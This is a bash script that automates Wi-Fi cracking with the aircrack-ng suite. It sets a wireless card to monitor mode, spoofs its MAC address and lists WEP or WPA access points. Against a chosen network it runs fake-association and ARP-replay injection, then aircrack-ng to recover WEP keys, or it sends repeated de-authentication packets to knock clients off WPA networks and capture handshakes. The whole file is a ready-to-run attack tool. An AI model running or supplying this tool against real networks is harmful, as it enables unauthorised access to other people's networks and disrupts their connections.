#!/bin/bash

function resolve_dependencies {
AIRCRACK=$(command -v aircrack-ng)
NMCLI=$(command -v nmcli)
MACCHANGER=$(command -v macchanger)
XTERM=$(command -v xterm)

if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then

    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo ${f:5:${#f}-13}; done;)

    case $DISTRO in
        arch )
            INSTALL="pacman -S --noconfirm "
            ;;
        gentoo )
            INSTALL="emerge -a "
            ;;
        centos )
            INSTALL="apt-get -y install "
            ;;
        redhat )
            INSTALL="dnf -y install "
            ;;
        LinuxMint )
            INSTALL="apt-get -y install "
            ;;
        debian )
            INSTALL="apt-get -y install "
            ;;
        OpenSUSE )
            INSTALL="zypper -n install "
            ;;
        fedora )
            INSTALL="dnf -y install "
            ;;
        * )
            echo -ne "Unable to determine Linux Distribution!"
            exit 1
    esac

    if [[ -z "$AIRCRACK" ]]; then
        AIRCRACK="aircrack-ng"
    else
        unset AIRCRACK
    fi

    if [[ -z "$NMCLI" ]]; then
        NMCLI="networkmanager"
    else
        unset NMCLI
    fi

    if [[ -z "$MACCHANGER" ]]; then
        MACCHANGER="macchanger"
    else
        unset MACCHANGER
    fi

    if [[ -z "$XTERM" ]]; then
        XTERM="xterm"
    else
        unset XTERM
    fi

    read -p "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system, install now ?" DYN
    if [[ "$DYN" = y ]]; then
        $INSTALL $AIRCRACK $NMCLI $MACCHANGER $XTERM
        resolve_dependencies
    else
        clear
        echo "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system."
        exit 1
    fi
else
    :
fi
}
function choose_mode {
    read -p "Begin ? [yn] : " ANSWER
    if [[ "$ANSWER" = y ]]; then
        echo "1) WEP"
        echo "2) WPA1/2"
        echo
        read -p "Select Cracking Mode : " MODE
            if [[ "$MODE" = 1 ]]; then
                MODE=WEP
                list_APs
                crack_wep
            elif [[ "$MODE" = 2 ]]; then
                MODE=WPA
                list_APs
                crack_wpa
            fi
    else
        check_wlan
    fi
}
function list_APs {
    readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $MODE)
    if [[ -z "$LINES" ]]; then
        echo "No WEP Networks found."
        exit 0
    else
        echo
        echo "Select an AP"
        echo "SSID  CHAN    BSSID   SECURITY    SIGNAL"
        select CHOICE in "${LINES[@]}"; do
            [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
            break
        done
        read -r AP <<< "$CHOICE)"
        clear
        echo "You picked ($AP"
        BSSID=$(echo $AP | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
        CHAN=$(echo $AP | awk -F ':' '{print $2}')
        ESSID=$(echo $AP | awk -F ':' '{print $1}')
        echo "AP Name: "$ESSID
        echo "AP chanel: "$CHAN
        echo "AP MAC: "$BSSID
    fi
}
function crack_wpa {
    clear
    IFACE=$(ls /sys/class/net | grep $IFACE)
    ESSID=$(tr -d ' ' <<< $ESSID)
    AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""

    env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &

    ASN=y
    while [[ "$ASN" != n ]]; do
        read -p "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
        read -p "How many times ?" TIMES
        aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
        read -p "Try again ? [yn] " ASN
        clear
    done
}
function crack_wep {
    clear
    IFACE=$(ls /sys/class/net | grep $IFACE)
    ESSID=$(tr -d ' ' <<< $ESSID)
    AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""
    
    env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &
    COUNTER=3
    until [[ $COUNTER -lt 1 ]]; do
        echo "Attempting to Associate... $COUNTER"
        let COUNTER-=1
        SUCCESS=$(aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE" | grep "Association successful :-) (AID: 1)")
        if [[ -n $SUCCESS ]]; then
            echo "Association successful!"
            echo "Initiating ARP Replay attack..."
            aireplay-ng -3 -b "$BSSID" -h "$NEWMAC" "$IFACE" &>/dev/null &
            echo
            break
        else
            echo "Association failed, trying again..."
        fi
    done
    if [[ -z $SUCCESS ]]; then
        echo "Unable to Associate, exiting..."
        exit 1
    fi
    
    echo "Wait for #Data in airodump-ng to reach at least 15k"
    sleep 2
    read -p "Try cracking $ESSID now ? [yn] : " ANSWER
    if [[ "$ANSWER" = y ]]; then
       readarray -t FILES < <(find `pwd` -name "*.cap")
       if [[ -z "$FILES" ]]; then
            echo "No .cap files found."
            exit 0
        else
            echo "Select a .cap file to crack"
            select CHOICE in "${FILES[@]}"; do
                [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
                break
            done
            read -r CAP <<< "$CHOICE"
        fi
        echo $CAP
        COMMAND4="aircrack-ng $CAP"
        env -u SESSION_MANAGER xterm -hold -e $COMMAND4 &
    else
        disown
        read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ?" ASR
        if [[ "$ASR" = y ]]; then
           rm -f $ESSID*.cap
           rm -f $ESSID*.netxml
           rm -f $ESSID*.csv
           rm -f replay*.cap
        fi
        PID=$(ps aux | grep aireplay | grep -v grep | awk -F ' ' '{print $2}')
        kill $PID
    fi
}
function show_mac {
    list_ifaces
    MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    echo "$IFACE MAC : $MAC"
}
function unset_mon {
    if [[ -z "$STATE" ]]; then
        echo
        echo "Monitor mode was not set on $IFACE."
        exit 0
    else
        echo
        echo "Disabling Monitor Mode for $IFACE..."
        echo
        echo "Bringing $IFACE down..."
        ifconfig $IFACE down >> /dev/null
        echo "Reverting MAC address to factory default..."
        macchanger -p $IFACE  >> /dev/null
        echo "Bringing $IFACE up..."
        ifconfig $IFACE up >> /dev/null
        echo "Disabling monitor mode for $IFACE..."
        airmon-ng stop $IFACE >> /dev/null
        echo "$IFACE is no longer in monitor mode."
    fi
}
function set_mon {
    if [[ -z "$STATE" ]]; then
        echo
        echo "Setting $IFACE in Monitor Mode..."
        echo
        echo "Creating new interface..."
        airmon-ng start $IFACE >> /dev/null
        IFACE=$(ls /sys/class/net | grep $IFACE) >> /dev/null
        echo "Bringing $IFACE down..."
        ifconfig $IFACE down >> /dev/null
        echo "Changing MAC address for $IFACE"
        macchanger -m 00:11:22:33:44:55 $IFACE >> /dev/null
        echo "Bringing $IFACE up..."
        ifconfig $IFACE up >> /dev/null
        NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
        echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
    else
        echo
        echo "$IFACE already in monitor mode."
        NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
        choose_mode
    fi
}
function menu {
    clear
    echo "1) Start Monitor Mode"
    echo "2) Stop Monitor Mode"
    echo "v) View APs"
    echo "s) Show WLAN interface MAC"
    echo "q) Abort!"
    echo
    PROMPT='Choose : '
    echo -n "$PROMPT"
}
function list_ifaces {
    readarray -t IFACES < <(ls /sys/class/net | grep wl)
    echo "Select an interface "
    select CHOICE in "${IFACES[@]}"; do
        [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
        break
    done
    read -r IFACE <<< "$CHOICE"
    echo "You picked : $IFACE"
}
function single_interface {
    STATE=$(ls /sys/class/net | grep mon)
    IFACE=$(ls /sys/class/net | grep wl)
    MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    menu
    while read -n1 CHAR
    do
        case $CHAR in
            1 )
                set_mon
                choose_mode
                break 
                ;;
            2 )
                unset_mon
                break
                ;;
            v )
                nmcli dev wifi list
                break
                ;;
            s )
                echo
                echo "$IFACE : $MAC"
                break
                ;;
            q )
                exit 0
                ;;
            * )
                echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
        esac
    done
}
function multiple_interfaces {
    clear
    echo "You have multiple interfaces"
    list_ifaces
    echo
    if [[ -z "$IFACE" ]]; then
        exit 0
    else
        menu
        while read -n1 CHAR
        do
            case $CHAR in
                1 )
                    STATE=$(echo $IFACE | grep mon)
                    set_mon
                    choose_mode
                    break
                    ;;
                2 )
                    STATE=$(echo $IFACE | grep mon)
                    unset_mon
                    break
                    ;;
                v )
                    nmcli dev wifi list 
                    break
                    ;;
                s )
                    show_mac
                    break
                    ;;
                q )
                    exit 0
                    ;;
                * )
                    echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
            esac
        done
    fi
}
function check_root {
    if [[ "$EUID" -ne 0 ]]; then
        echo "This script must be run as root" 1>&2
        exit 1
    fi
}
function check_wlan {
IFACENUM=$(ls /sys/class/net/ | grep wl |  wc -l)

if [[ "$IFACENUM" -gt 1 ]]; then
    multiple_interfaces
elif [[ "$IFACENUM" -eq 1 ]]; then
    single_interface
elif [[ "$IFACENUM" -eq 0 ]]; then
    echo "No WLAN interfaces found."
fi
}
resolve_dependencies
check_root
check_wlan